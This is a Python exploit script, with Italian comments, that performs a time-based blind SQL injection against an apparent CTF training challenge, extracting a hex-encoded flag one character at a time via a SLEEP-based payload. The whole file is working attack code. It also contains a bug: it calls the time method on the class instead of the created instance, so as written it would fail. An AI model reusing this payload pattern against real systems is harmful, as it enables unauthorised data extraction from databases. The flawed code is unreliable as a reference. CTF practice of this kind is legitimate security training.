import requests
import time
import sys

# La classe Inj rimane come l'hai fornita (è corretta per l'API)
class Inj:
    
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token
    
    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']
    
    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

# --- CONFIGURAZIONE E ATTACCO ---

HOST_URL = "http://web-17.challs.olicyber.it"  # <--- SOSTITUISCI CON L'URL REALE

# Inizializza l'oggetto Inj UNA SOLA VOLTA!
try:
    inj = Inj(HOST_URL)   
except Exception as e:
    print(f"Errore inizializzazione Inj: {e}")
    sys.exit(1)


possible = '0123456789abcdef' # Ho messo minuscole, più comune in HEX
guess = ''
SLEEP_TIME = 1.0
TIME_THRESHOLD = SLEEP_TIME + 0.5 # Soglia di 1.5 secondi per distinguere


print(f"[*] Inizio Time-Based SQLi (Soglia: {TIME_THRESHOLD:.1f}s)...")

while True:
    found = False
    
    for c in possible:
        trial = guess + c
        
        # Payload Time-Based Corretto (utilizza la variabile 'trial'):
        # La condizione SQL è: SE (HEX(flag) LIKE 'prefisso%') ALLORA SLEEP(1) ALTRIMENTI NOP.
        query = f"1' AND IF(HEX(flag) LIKE '{trial}%', SLEEP({SLEEP_TIME}), 0)='1"

        start = time.time() # Usa time.time()
        Inj.time(query)
        elapsed = time.time() - start

        # Stampa il progresso e il tempo di risposta
        print(f"[-] Tentativo: {trial:<{len(guess)+1}} | Tempo: {elapsed:.3f}s", end='\r')
        sys.stdout.flush()

        if elapsed > TIME_THRESHOLD:
            guess += c
            found = True
            print(f"\n[+] Match parziale: {guess} (Tempo: {elapsed:.3f}s)")
            break
    
    if not found:
        # Nessun carattere nel dizionario ha prodotto un ritardo. Fine.
        break

print(f"\n[!!!] Flag trovata (HEX): {guess}")